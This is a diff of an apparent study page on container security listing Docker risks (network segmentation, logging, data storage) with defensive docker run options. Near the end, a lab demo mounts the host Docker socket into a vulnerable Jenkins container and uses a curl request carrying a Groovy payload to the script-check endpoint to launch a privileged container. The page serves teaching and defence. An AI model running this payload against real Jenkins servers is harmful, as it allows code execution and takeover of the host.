@@ -77,22 +77,59 @@ Adds Network Bind Service -- ``` docker run --cap-add=NET_BIND_SERVICE -d my-ima
 - SYS_PTRACE is a linux kernal process / capability which traces and debugs other process. It can reads / modifies memory, registry and extract sensitive data.
 
 </details>
-
+<details>
 <summary> 6: Inadequate Network Segmentation
   
-- Process running in different conmtainers may interact with each other. 
-- This can lead to cross container compromise and data breaches.
-- Resolution: Implementation process isolation through Namespace isolation (It Isolates Network, File system) and cgroups (Helps to limit resources that container can consume like CPU, memory, I/O)
+- Can lead to Data exfilteration and unauthorised access.
+- Containers are their networks are not properly isolated from eachother.
+- Resolution: Implementation of network segmentation will isolate containers from each other.
+- Virtual networks will Isolates Network traffic, firewalls controls inbound and Outbound network traffic and security groups will limit network traffic.
 - Best practises: Implementation of orchestratrion (like kubernetes have default security measures)
-- Use option --pid when starting the container. Process runnin gunder the pid cannot access process on host system. 
-``` docker run --pid=container -d my-image ```
-- Limit CPU usage when starting container.
-``` docker run --cpu-share=512 --memory=512m --memory-swap=1g -d my-image ```  
+- Use option --network option ```docker run --network=my-network -d my-image```
+</details>
 
-### Cross Container Compromise with SYS_PTRACE capability
-- SYS_PTRACE is a linux kernal process / capability which traces and debugs other process. It can reads / modifies memory, registry and extract sensitive data.
+<details>
+<summary> 7: Inadequate Logging and Monitoring
+  
+- Logging helps in detecting and resposding to attacks.
+- All important events in containers need to be logged.
+- Resolution: Collect logs from host system, Conatinerns and orchestration platform.
+- Best practises: Use SIEM tools to detect and respond in real-time.
+- Best practises: Implementation of orchestratrion (like kubernetes have default security measures)
+</details>
+
+<details>
+<summary> 8: Insecure Data Storage in Containers 
+  
+- May lead to data breaches. Sensitive data maynot be properly secured.
+- Resolution: Encrypt sensitive data, use secure storage options like NAS (Network attached Storage) or SAN (Styorage area networks)
+- Best practises: Use access controls like RBAC (role-based access control).
+- Best practises: Implementation of orchestratrion (like kubernetes have default security measures)
+- use option -v , while starting a container, to mount a host directory as a data volume inside a container.
+``` docker run -v /data:/data -d my-image ```
+- Even after container is deleted, mounted data will be secured in host system.
+- Use NAS / SAN as data volume using --mount option. This allows more flexibility to specify the type of mount (like bind, read-only, consistency). 
+``` docker run --mount type=bind, source=/data, target=/data -d my-image ```
 
 </details>
 
+### Mounting a Docker Socket (docker.sock)
+- Mounting Docker socket will make docker daemon hosts's unix socker available inside the container.
+- It allows container to interact with docker host and access docker api to run / manage containers.
+- This is a security risk, as container will have full access to docker host. So it need to be done with trusted containers.
+- Can use option -v / --mount in docker run command and specify path of docker socket in host and target path inside the container.
+- It can start / stop containers, mnodify images, accessing hor file systems.
+- If Attacker gain access to this container, he can use mounted docker socket to control docker deamon and take over host system.
+- Best practise: Use a seperate container to manage docker deamon.
+
+``` docker run -d -p 8080:8080 --rm -v /var/run/docker.scok:/var/run/docker.sock --name jenkins -t vuln-jenkins:latest ```
+
+ ![image](https://github.com/Vamckis/Container-Security/assets/71128825/03976075-072a-4902-a561-179c2d394388)
+ - Creating ngnix container with --privileged option
+``` curl -k -4 -X POST "http://localhjost:8080//descriptorByName/org.jenkins.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d 'value=class abcd{abcd(){"docker run -P --rm --privileged --name ngnix".execute()}}' ``` </br>
+![image](https://github.com/Vamckis/Container-Security/assets/71128825/a0f2868f-62da-462b-905a-d2d953111f4c)
+
+
 ### References:
 - https://www.cybereason.com/blog/container-escape-all-you-need-is-cap-capabilities
+- https://github.com/ec-council-learning/OWASP-Top-10-for-Docker-Containers-and-Kubernetes-Security
